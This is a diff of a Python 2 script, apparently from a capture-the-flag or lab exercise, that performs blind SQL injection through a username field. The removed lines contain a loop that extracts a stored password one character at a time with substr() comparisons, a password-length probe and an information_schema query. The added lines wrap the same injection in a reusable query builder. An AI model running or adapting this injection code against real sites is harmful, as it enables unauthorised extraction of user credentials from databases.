@@ -43,25 +43,14 @@ def is_successful(html):
         return False
 
 
-for j in range(1, 61):
-    print 'passwd',j,':'
-    for i in range(32, 127):
-        html = get_token("shinian' and substr(password," + str(j) + ",1)='" + chr(i) + "'# ")
-        if fail_message in html:
-            continue
-            # print 'fail'
-        elif suc_message in html:
-            print 'sucess', chr(i)
-            break
-        else:
-            print 'error syntax'
+def generate_query_str(injection_str):
+    return "shinian' " + injection_str + "# "
 
 
-def get_passwd_len():
-    for i in range(55, 70):
-        html = get_token("shinian' and length(password)='" + str(i) + "'# ")
-        if is_successful(html):
-            print i
-
-
-html = get_token("shinian' and " + "(select count(*) from information_schema.tables)<100" + "'# ")
+query_str = generate_query_str("")
+print query_str
+html = get_token(query_str)
+if is_successful(html):
+    print 'got it'
+else:
+    print 'fail'
